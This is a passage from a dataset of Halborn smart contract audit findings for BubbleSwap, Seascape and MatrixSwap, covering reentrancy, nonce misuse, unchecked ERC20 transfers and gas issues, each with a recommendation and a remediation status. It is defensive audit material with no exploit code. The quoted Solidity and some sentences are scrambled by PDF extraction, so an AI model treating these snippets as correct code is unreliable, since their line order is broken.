recipient , params . sqrtPriceLimitX96 , SwapCallbackData ({ path : abi . encodePacked ( params . tokenIn , 1 function exactInputSingle ( ExactInputSingleParams memory params )  external payable override returns ( uint256 amountOut ) { 2 3 4 5 6  params . fee , params . tokenOut ) , payer : msg . sender }) 7 8  received \") ; 9 } ); require ( amountOut >= params . amountOutMinimum , \" Too little Risk Level: Likelihood - 1 Impact - 1 34 Recommendation: Consider removing the unused parameter in order to call the aforementioned functions. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team wants to keep the parameter to ensure interface compatibility with other projects. 35 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Informational"]}, {"title": "CREATE CUSTOM ERRORS TO SAVE GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Custom errors are available from Solidity version 0.8.4. Custom errors save ~50 gas each time they are hit by avoiding having to allocate and store the revert string. Not defining strings also saves deployment gas. Although the project uses custom on errors on several contracts, the next contracts do not use them:  V3SwapRouter.sol.  ConcentratedLiquidityPoolStaker.sol.  ConcentratedLiquidityPoolHelper.sol.  ConcentratedLiquidityPoolManager.sol. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider replacing all revert strings with custom errors. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team acknowledged this finding. 36 3.10 (HAL-10) INCOMPLETE NATSPEC DOCUMENTATION - INFORMATIONAL ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Informational"]}, {"title": "SIGNATURE NONCES ARE IMPLEMENTED INCORRECTLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the MinerGame contract, a nonce state variable is used to prevent signature replay attacks: Listing 1: MinerGame.sol 22 uint256 public nonce ; Listing 2: MinerGame.sol (Lines 63,72) { bytes32 hash bytes memory prefix bytes32 message require ( _nftId > 0, \" MinerGame : nft Id invalid \" ); = \" \\ x19Ethereum Signed Message :\\ n32 \"; = keccak256 ( abi . encodePacked ( _nftId , MineNFT nft = MineNFT ( mineNft ); require ( nft . ownerOf ( _nftId ) == msg . sender , \" MinerGame : Not 55 function importNft ( uint256 _nftId , uint8 _v , bytes32 _r , bytes32  _s ) external { 56 57 58 59  mineNft owner \" ); 60 61 62 63  msg . sender , address ( this ) , nonce )); 64  message )); 65 66 67  stakeToken \" ); 68 69 70 71 72 73 74 75 76 PlayerParams storage _player = player [ msg . sender ]; _player . nftId = _nftId ; _player . stakeTime = block . timestamp ; nft . safeTransferFrom ( msg . sender , address ( this ) , _nftId ); require ( recover == verifier , \" Verification failed about = keccak256 ( abi . encodePacked ( prefix , = ecrecover ( hash , _v , _r , _s ); address recover nonce ++; } 12 77 78 79 80 81 } mineOwners [ _nftId ] = msg . sender ; emit ImportNft ( msg . sender , _nftId , block . timestamp ); Listing 3: MinerGame.sol (Line 126) 114 function goldChangeToken ( uint256 _gold , uint8 _v , bytes32 _r ,  bytes32 _s ) external { 115 require ( _gold > 0, \" MinerGame : The exchange amount must  greater than zero \" ); 116 117 118 119 120 121 122 123 124 125  ; 126 uint256 chainId ; assembly { chainId := chainid () } PlayerParams storage _player = player [ msg . sender ]; { bytes memory prefix = \"\\ x19Ethereum Signed Message :\\ n32 \" bytes32 message = keccak256 ( abi . encodePacked ( _gold ,  msg . sender , nonce , address ( this ) , chainId )) ; 127 bytes32 hash = keccak256 ( abi . encodePacked ( prefix ,  message )); 128 129 130 address recover = ecrecover ( hash , _v , _r , _s ); require ( recover == verifier , \" Verification failed about  stakeToken \" ); } 131 132 133 134 135 136 137 138 nonce ++; uint256 _tokenAmount = _gold * MULTIPLIER / ratio ; _safeTransfer ( token [0] , msg . sender , _tokenAmount ); emit GoldChangeToken ( msg . sender , _gold , _tokenAmount , block .  timestamp ); 139 140 141 } } 13 This nonce variable is increased each time, the functions importNft() or goldChangeToken() are called. Although, the signer does not really know the order in which the users will call these functions. Hence, if the backend for example generates a signature for a user and this user does not call the function right after that, his signature will be invalid after someone else calls any of those functions. Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to use a mapping instead of a global counter as a nonce to solve this issue: mapping(address => uint256)public _nonces; Remediation Plan: SOLVED: The Seascape team solved this issue and now uses the suggested mapping as a nonce. 14 ", "labels": ["Halborn", "Seascape_Mini_Miners", "Severity: Medium"]}, {"title": "REENTRANCY IN MINERGAME.EXPORTNFT FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the MinerGame contract, the exportNft() function is used to unstake the Mine NFT: Listing 4: MinerGame.sol (Line 88) require ( mineOwners [ _nftId ] == msg . sender , \" MinerGame : Not the MineNFT nft = MineNFT ( mineNft ); nft . safeTransferFrom ( address ( this ) , msg . sender , _nftId ); 84 function exportNft ( uint256 _nftId ) external { 85  owner \" ); 86 87 88 89 90 91 92 93 94 95 96 97 } PlayerParams storage _player = player [ msg . sender ]; delete _player . nftId ; delete _player . stakeTime ; delete mineOwners [ _nftId ]; emit ExportNft ( msg . sender , _nftId , block . timestamp ); As we can see above, the Mine NFT is sent back to the user with safeTransferFrom() check This a if the contract is receiver the _checkOnERC721Received hook. safeTransferFrom() if call. a smart calls calls so, and it This passed the control flow to the receiver and opens up a reentrancy vulnerability as the user, in this case the smart contract, got the NFT but the state variables player[msg.sender] and mineOwners[_nftId] are still not deleted/updated. 15 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a nonReentrant modifier to the exportNft() function. Other option is updating the exportNft() function as shown below: Listing 5: MinerGame.sol (Line 96) require ( mineOwners [ _nftId ] == msg . sender , \" MinerGame : Not the MineNFT nft = MineNFT ( mineNft ); 84 function exportNft ( uint256 _nftId ) external { 85  owner \" ); 86 87 88 89 90 91 92 93 94 95 96 97 } PlayerParams storage _player = player [ msg . sender ]; delete _player . nftId ; delete _player . stakeTime ; delete mineOwners [ _nftId ]; emit ExportNft ( msg . sender , _nftId , block . timestamp ); nft . safeTransferFrom ( address ( this ) , msg . sender , _nftId ); Remediation Plan: SOLVED: The Seascape team solved this issue and updated the exportNft() function as suggested. 16 ", "labels": ["Halborn", "Seascape_Mini_Miners", "Severity: Low"]}, {"title": "UNUSED STORAGE POINTER IN MINERGAME.GOLDCHANGETOKEN FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the MinerGame contract the goldChangeToken() creates a storage pointer to the player mapping, but then it does not make any use of it: Listing 6: MinerGame.sol (Line 122) 114 function goldChangeToken ( uint256 _gold , uint8 _v , bytes32 _r ,  bytes32 _s ) external { 115 require ( _gold > 0, \" MinerGame : The exchange amount must greater  than zero \"); 116 117 118 119 120 121 122 123 124 125 126 uint256 chainId ; assembly { chainId := chainid () } PlayerParams storage _player = player [ msg . sender ]; { bytes memory prefix bytes32 message = \" \\ x19Ethereum Signed Message :\\ n32 \"; = keccak256 ( abi . encodePacked ( _gold ,  msg . sender , nonce , address ( this ) , chainId )) ; 127 bytes32 hash = keccak256 ( abi . encodePacked ( prefix ,  message )); 128 129 130 address recover = ecrecover ( hash , _v , _r , _s ); require ( recover == verifier , \" Verification failed about  stakeToken \" ); } nonce ++; uint256 _tokenAmount = _gold * MULTIPLIER / ratio ; _safeTransfer ( token [0] , msg . sender , _tokenAmount ); 131 132 133 134 135 136 137 17 138 emit GoldChangeToken ( msg . sender , _gold , _tokenAmount , block .  timestamp ); 139 140 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the pointer to the player mapping to reduce the gas costs of the goldChangeToken() function. Remediation Plan: SOLVED: The Seascape team solved this issue and removed the pointer to the player mapping. 18 ", "labels": ["Halborn", "Seascape_Mini_Miners", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In multiple contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: MineNFTFactory.sol - mint() (MineNFTFactory.sol#34-37) - setNft() (MineNFTFactory.sol#42-44) - addAdmin() (MineNFTFactory.sol#47-50) - renounceAdmin() (MineNFTFactory.sol#53-56) - addGenerator() (MineNFTFactory.sol#85-88) - removeGenerator() (MineNFTFactory.sol#91-94) MineNFT.sol - mint() (MineNFT.sol#35-46) - setOwner() (MineNFT.sol#48-50) - setFactory() (MineNFT.sol#52-54) - setBaseUri() (MineNFT.sol#56-58) MinerGame.sol - withdraw() (MinerGame.sol#188-195) - addToken() (MinerGame.sol#198-206) - setScale() (MinerGame.sol#209-212) CrownsToken.sol - burn() (CrownsToken.sol#96-98) - burnFrom() (CrownsToken.sol#111-118) - name() (CrownsToken.sol#127-129) - symbol() (CrownsToken.sol#135-137) - decimals() (CrownsToken.sol#148-150) - totalSupply() (CrownsToken.sol#155-157) - balanceOf() (CrownsToken.sol#162-164) - transfer() (CrownsToken.sol#173-176) 19 - approve() (CrownsToken.sol#203-206) - transferFrom() (CrownsToken.sol#217-227) - increaseAllowance() (CrownsToken.sol#241-244) - decreaseAllowance() (CrownsToken.sol#260-268) MscpToken.sol - burn() (MscpToken.sol#96-98) - burnFrom() (MscpToken.sol#111-118) - name() (MscpToken.sol#127-129) - symbol() (MscpToken.sol#135-137) - decimals() (MscpToken.sol#148-150) - totalSupply() (MscpToken.sol#155-157) - balanceOf() (MscpToken.sol#162-164) - transfer() (MscpToken.sol#173-176) - approve() (MscpToken.sol#203-206) - transferFrom() (MscpToken.sol#217-227) - increaseAllowance() (MscpToken.sol#241-244) - decreaseAllowance() (MscpToken.sol#260-268) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce the gas costs. Remediation Plan: SOLVED: The Seascape team solved this issue and declared the functions as external, reducing the gas costs. 20 ", "labels": ["Halborn", "Seascape_Mini_Miners", "Severity: Informational"]}, {"title": "STATE VARIABLES MISSING CONSTANT MODIFIER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Mini_Miners_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "State variables can be declared as constant or immutable. In both cases, the variables cannot be modified after the contract has been constructed. For constant variables, the value has to be fixed at compile-time, while for immutable, it can still be assigned at construction time. The following state variables are missing the constant modifier: CrownsToken.sol - Line 30: uint256 public limitSupply = 1111111111000000000000000000; /// 1.1 billion MscpToken.sol - Line 30: uint256 public limitSupply = 1111111111000000000000000000; /// 1.1 billion Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add the constant modifier to the state variables mentioned. Remediation Plan: SOLVED: The Seascape team solved this issue and declared the suggested state variables as constants. 21 ", "labels": ["Halborn", "Seascape_Mini_Miners", "Severity: Informational"]}, {"title": "INCOMPATIBILITY WITH NON", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some tokens (like USDT) dont correctly implement the EIP20 standard and their transfer/transferFrom functions return void, instead of a success boolean. Calling these functions with the correct EIP20 function signatures will always revert as it is done in the contract AllRouterSwap .sol. Tokens that dont correctly implement the latest EIP20 spec, like USDT, will be unusable in the smart contract as they revert the transaction because of the missing return value. We recommend using OpenZeppelins SafeERC20 versions with the safeTransfer and safeTransferFrom functions that handle the return value check as well as non-standard-compliant tokens. On the other hand, in the 1st remediations Commit ID a0ff1260d21d253bab3b4ee053d8bbaf79ea6f2c the same issue with the approve function was added into the code. Proof of Concept: 13 Code Location:  require(IERC20(inputToken).transfer(msg.sender, _amountIn), errorMessage); (AllRouterSwap.sol#296)  require(IERC20(inputToken).transfer(msg.sender, _amountIn), errorMessage); (AllRouterSwap.sol#308) 1st remediations Commit ID a0ff1260d21d253bab3b4ee053d8bbaf79ea6f2c: Listing 1: AllRouterSwap.sol 165 bool approved = IERC20Upgradeable ( _tokenAddress ). approve ( address ( _router ) , _amountIn . add (100000000000000000000) ) ; 166 require ( approved , errorMessage ); Listing 2: AllRouterSwap.sol 196 bool approved = IERC20Upgradeable ( _firstPath ). approve ( address ( _router ) , _amountIn ); 197 require ( approved , errorMessage ); Listing 3: AllRouterSwap.sol 196 bool approved = IERC20Upgradeable ( _tokenAddress ). approve ( address ( _router ) , _amountIn . add (100000000000000000000) ) ; 197 require ( approved , errorMessage ); Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to use SafeERC20: safeTransfer and safeApprove. 14 Remediation Plan: SOLVED: and The MatrixSwap team The safeApprove. non-standard fe0037de0bf9254b82e6726ff38dda1da2e57dc. tokens ERC20 like USDT. Fixed correctly uses now contract is now safeTransfer with 7 compatible commit ID in 15 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: High"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract AllRouterSwap.sol the return value of some external transfer/transferFrom calls are not checked. Several tokens do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location:  IERC20(inputToken).transfer(owner,_fee) (AllRouterSwap.sol#148)  IERC20(_firstPath).transfer(owner,_fee) (AllRouterSwap.sol#176)  IERC20(_tokenAddress).transfer(owner,_fee) (AllRouterSwap.sol#196)  IERC20(_token).transferFrom(msg.sender,address(this),_amountIn) (AllRouterSwap.sol#211)  IERC20(inputToken).transferFrom(msg.sender,address(this),_amountIn [i]) (AllRouterSwap.sol#331) Risk Level: Likelihood - 2 Impact - 4 Recommendation: is It transfer/transferFrom return value is checked. recommended SafeERC20, use to or ensure that the Remediation Plan: SOLVED: safeTransferFrom. The MatrixSwap team correctly uses now safeTransfer and 16 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Medium"]}, {"title": "UNUSED RETURN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The return value of some external calls are not stored in a local or state variable. In the contract AllRouterSwap.sol there are instances were external methods are being called and the return values are ignored. Code Location:  IERC20(_tokenAddress).approve(address(_router),_amountIn.add (100000000000000000000)) (AllRouterSwap.sol#150)  IERC20(_firstPath).approve(address(_router),_amountIn) (AllRouterSwap.sol#179)  _router.swapExactTokensForETH(_amountIn,_minimumAmountOut,_path, msg.sender,block.timestamp + 180) (AllRouterSwap.sol#180-186)  IERC20(_tokenAddress).approve(address(_router),_amountIn.add (100000000000000000000)) (AllRouterSwap.sol#199) Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ensure that all the return values of the function calls are used. Add a return value check to avoid an unexpected crash of the contract. Remediation Plan: SOLVED: The MatrixSwap team correctly uses now safeApprove. 17 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was identified that the contract AllRouterSwap is missing nonReentrant guard in the public functions swap and swapToETH. Even if the functions are following the check-effects-interactions pattern we still recommend to use a mutex in order to be protected against cross-function reentrancy By using this lock, an attacker can no longer exploit the attacks. OpenZeppelin has its own mutex function with a recursive call. implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 4: AllRouterSwap.sol 312 function swap ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , bool [] memory _isEth , address _tokenTarget , bool _isMultiToSingleToken , bool _isSingleEth , uint [] memory _minimumAmountOut , bool _isNukeTx ) public payable 313 { 314 315 316 317 318 319 320 321 322 323 324 325 isSingleEth = _isSingleEth ; isMultiToSingleToken = _isMultiToSingleToken ; isMultiSwap = _token . length > 1; isNukeTx = _isNukeTx ; for ( uint8 i = 0; i < _token . length ; i ++) { inputToken = SwapLibrary . _getToken ( _token [i ], _tokenTarget , _isMultiToSingleToken , true ); outputToken = SwapLibrary . _getToken ( _token [ i], _tokenTarget , _isMultiToSingleToken , false ); if (! _isSingleEth && ! _isMultiToSingleToken && _isEth [ i ]) { 18 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 _everySwapToEth ( _amountIn [i ], inputToken , _swapRoute [ i ], _minimumAmountOut [i ]) ; continue ; } else if (!( SwapLibrary . _isInputAllEth ( isMultiToSingleToken , isSingleEth ) || ( _isEth [ i ] && isMultiToSingleToken )) ) { } IERC20 ( inputToken ). transferFrom ( msg . sender , address ( this ) , _amountIn [ i ]) ; // 1 Router , 2 Tokens if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && _swapRoute [ i ][1] == 0) { } _twoTokensSwap ( routerList [ _swapRoute [ i ][0] -1] , _amountIn [i ], _isEth [i ], _minimumAmountOut [ i ]) ; // 1 Router , 3 Tokens else if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && _swapRoute [i ][1] > 0) { } _threeTokensSwap ( commonTokens [ _swapRoute [ i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , _amountIn [ i ], _isEth [i ], _minimumAmountOut [ i ]) ; // 2 Routers , 3 Tokens else if ( _swapRoute [ i ][0] != _swapRoute [ i ][2]) { _twoRoutersSwap ( commonTokens [ _swapRoute [i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , routerList [ _swapRoute [ i ][2] -1] , _amountIn [ i ], _isEth [ i ], _minimumAmountOut [ i ]) ; } } 350 351 352 } 353 354 function swapToETH ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , uint [] memory _minimumAmountOut ) public 355 { 356 isMultiSwap = _token . length > 1; 19 357 358 359 360 361 for ( uint i = 0; i < _token . length ; i ++) { inputToken = _token [ i ]; outputToken = addressWETH ; _everySwapToEth ( _amountIn [ i ], _token [ i ], _swapRoute [ i], _minimumAmountOut [ i ]) ; 362 363 } } Risk Level: Likelihood - 1 Impact - 3 Recommendation: We recommend using ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The MatrixSwap team correctly added the nonReentrant modifier. 20 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location:  block.timestamp + 180 (AllRouterSwap.sol#139)  block.timestamp + 180 (AllRouterSwap.sol#156)  block.timestamp + 180 (AllRouterSwap.sol#185)  block.timestamp + 180 (AllRouterSwap.sol#205) Risk Level: Likelihood - 3 Impact - 1 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: The MatrixSwap team is not using block.timestamp anymore in the smart contract. 21 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Code Location: Listing 5 1 utils / SafeMath . sol :3: pragma solidity ^0.8.0; 2 utils / Initializable . sol :3: pragma solidity ^0.8.0; 3 TokenPrice . sol :2: pragma solidity ^0.8.0; 4 library / SwapLibrary . sol :2: pragma solidity ^0.8.0; 5 Box . sol :3: pragma solidity ^0.8.0; 6 ApprovedTokens . sol :2: pragma solidity ^0.8.7; 7 AllRouterSwap . sol :2: pragma solidity ^0.8.7; 8 AdminBox . sol :3: pragma solidity ^0.8.0; Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is not recommended to use a Consider locking the pragma version. floating pragma in production. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. 22 Remediation Plan: SOLVED: The MatrixSwap team correctly locked the pragma version to the 0.8.7 version. 23 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Low"]}, {"title": "EXTERNAL CALLS WITHIN A LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Calls inside a loop might lead to a Denial of Service attack. If the i variable iterates up to a very high value or is reset by the external functions called, this could cause a Denial of Service. Code Location: ApprovedTokens.sol Listing 6: ApprovedTokens.sol (Lines 29,31,35) external view returns ( address [] memory ) 23 function searchApprovedTokens ( address [] memory _tokens ) 24 25 26 27 { 28 address [] memory _approvedTokens = new address []( _tokens . length ); for ( uint16 i = 0; i < _tokens . length ; i ++) { console . log ( \" token :\" , _tokens [i ]) ; uint256 _allowance = IERC20 ( _tokens [i ]) . allowance ( msg . sender , swapContract ); uint256 _balance = IERC20 ( _tokens [ i ]) . balanceOf ( msg . sender ); // console . log (\" _allowance :\" , _allowance ) ; // console . log (\" _balance :\" , _balance ) ; if ( _allowance > _balance ) { _approvedTokens [ i ] = ( _tokens [ i ]) ; } } return _approvedTokens ; 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 } 24 AllRouterSwap.sol Listing 319,321,322,326,329,331,337,343,349,357,361) 7: AllRouterSwap.sol (Lines 312 function swap ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , bool [] memory _isEth , address _tokenTarget , bool _isMultiToSingleToken , bool _isSingleEth , uint [] memory _minimumAmountOut , bool _isNukeTx ) public payable 313 { 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 isSingleEth = _isSingleEth ; isMultiToSingleToken = _isMultiToSingleToken ; isMultiSwap = _token . length > 1; isNukeTx = _isNukeTx ; for ( uint8 i = 0; i < _token . length ; i ++) { inputToken = SwapLibrary . _getToken ( _token [i ], _tokenTarget , _isMultiToSingleToken , true ); outputToken = SwapLibrary . _getToken ( _token [ i], _tokenTarget , _isMultiToSingleToken , false ); if (! _isSingleEth && ! _isMultiToSingleToken && _isEth [ i ]) { _everySwapToEth ( _amountIn [i ], inputToken , _swapRoute [ i ], _minimumAmountOut [i ]) ; continue ; } else if (!( SwapLibrary . _isInputAllEth ( isMultiToSingleToken , isSingleEth ) || ( _isEth [ i ] && isMultiToSingleToken )) ) { } IERC20 ( inputToken ). transferFrom ( msg . sender , address ( this ) , _amountIn [ i ]) ; // 1 Router , 2 Tokens if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && _swapRoute [ i ][1] == 0) { } _twoTokensSwap ( routerList [ _swapRoute [ i ][0] -1] , _amountIn [i ], _isEth [i ], _minimumAmountOut [ i ]) ; // 1 Router , 3 Tokens else if ( _swapRoute [ i ][0] == _swapRoute [ i ][2] && 25 342 343 344 345 346 347 348 349 _swapRoute [i ][1] > 0) _threeTokensSwap ( commonTokens [ _swapRoute [ i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , _amountIn [ i ], _isEth [i ], _minimumAmountOut [ i ]) ; { } // 2 Routers , 3 Tokens else if ( _swapRoute [ i ][0] != _swapRoute [ i ][2]) { _twoRoutersSwap ( commonTokens [ _swapRoute [i ][1] -1] , routerList [ _swapRoute [ i ][0] -1] , routerList [ _swapRoute [ i ][2] -1] , _amountIn [ i ], _isEth [ i ], _minimumAmountOut [ i ]) ; } } 350 351 352 } 353 354 function swapToETH ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , uint [] memory _minimumAmountOut ) public 355 { 356 357 358 359 360 361 362 363 } isMultiSwap = _token . length > 1; for ( uint i = 0; i < _token . length ; i ++) { inputToken = _token [ i ]; outputToken = addressWETH ; _everySwapToEth ( _amountIn [ i ], _token [ i ], _swapRoute [ i], _minimumAmountOut [ i ]) ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: If possible, use pull over push strategy for external calls or limit the max. size of the arrays being iterated. 26 Remediation Plan: SOLVED: The MatrixSwap team correctly limited the maximum iterations of the loops by casting the i variable to uint8 and adding a require statement. For example: Listing 8: AllRouterSwap.sol (Lines 381,387) 379 function swapToETH ( uint [] memory _amountIn , address [] memory _token , uint8 [][] memory _swapRoute , uint [] memory _minimumAmountOut , uint [] memory _uintArray ) external nonReentrant 380 { 381 382 383 384 385 386 387 388 389 390 391 require ( _token . length < uint8 (40) , \" Block gas limit exceeded \" ) ; // uint [] memory _uintArray = [ _discount , _deadline ] isMultiSwap = _token . length > 1; discount = _uintArray [0]; deadline = _uintArray [1]; for ( uint8 i = 0; i < _token . length ; i ++) { inputToken = _token [ i ]; outputToken = addressWETH ; _everySwapToEth ( _amountIn [ i ], _token [ i ], _swapRoute [ i], _minimumAmountOut [ i ]) ; 392 393 } } 27 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract Box.sol there are functions marked as public but they are never directly called within the same contract or in any of its descendants: Box.sol - store(uint256) (Box.sol#12-15) - retrieve() (Box.sol#18-20) - decrement() (Box.sol#22-25) AllRouterSwap.sol - initialize(address,address,address[],address[]) (AllRouterSwap.sol#64-77) - changeOwner(address) (AllRouterSwap.sol#88-91) - addCommonToken(address) (AllRouterSwap.sol#93-96) - showOwner() (AllRouterSwap.sol#98-101) - [],bool) (AllRouterSwap.sol#312-352) - swapToETH(uint256[],address[],uint8[][],uint256[]) (AllRouterSwap.sol#354-363) swap(uint256[],address[],uint8[][],bool[],address,bool,bool,uint256 Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the function is not intended to be called internally or by descendants, it is better to mark all these functions as external to reduce gas costs. 28 Remediation Plan: SOLVED: The MatrixSwap team set all the mentioned functions as external to reduce gas costs. 29 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Informational"]}, {"title": "USE OF ASSERT FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract AllRouterSwap.sol the function assert is used. As per Solidity documentation: Assert The assert function creates an error of type Panic(uint256). should only be used to test for internal errors, and to check invariants. Properly functioning code should never create a Panic, not even on invalid external input. Code Location: Listing 9: Assertl (Lines 125) 121 if ( SwapLibrary . _isWrapUnwrap ( _path [0] , _path [1] , addressWETH )) 122 { 123 124 125 126 } WETH = IWETH ( _path [0]) ; WETH . deposit { value : _amountIn }() ; assert ( WETH . transfer ( msg . sender , _amountIn )); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use a require statement instead. 30 Remediation Plan: SOLVED: The MatrixSwap team is correctly using now a require statement. 31 MANUAL TESTING 32 4.1 TESTING CONTRACT INITIALIZATION FRONT-RUNNING As the contracts Swap and AdminBox make use of initialize functions we have checked if they could be front-run but this is not the case as they have a constructor: Do not leave an implementation contract uninitialized. An uninitialized implementation contract can be taken over by an attacker, which may impact the proxy. You can either invoke the initializer manually, or you can include a constructor to automatically mark it as initialized when it is deployed: AdminBox contract Swap contract G N I T S E T L A U N A M 33 Below we can see how they were automatically initialized right after being deployed: G N I T S E T L A U N A M 34 4.2 TESTING CONTRACT UPGRADEABILITY In this test we wanted to test the upgradeability of the contract. In order to do that we have created a SwapV2 contract which adds a new simple getter function: Listing 10: SwapV2 - getisSingleEth() 1 function get_isSingleEth () public view returns ( bool ){ 2 3 } return isSingleEth ; SwapV1 was deployed. As the next step, the owner of the SwapV1 contract was updated by calling changeOwner function. The new owner is accounts [1]. Then using a proxy upgrade pattern, we upgraded the Swap contract to the SwapV2, checked that the owner of the SwapV2 contract was still accounts[1] and called the new function: G N I T S E T L A U N A M It is also possible, as included in the test cases of the project, to upgrade the contract using the OpenZeppelin Upgrades Plugins. 35 ", "labels": ["Halborn", "MatrixSwap_DEX_Aggregator", "Severity: Informational"]}, {"title": "WEAK CMS PASSWORD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "Testing revealed that the application Content Management System (CMS) management interface was accessible with an 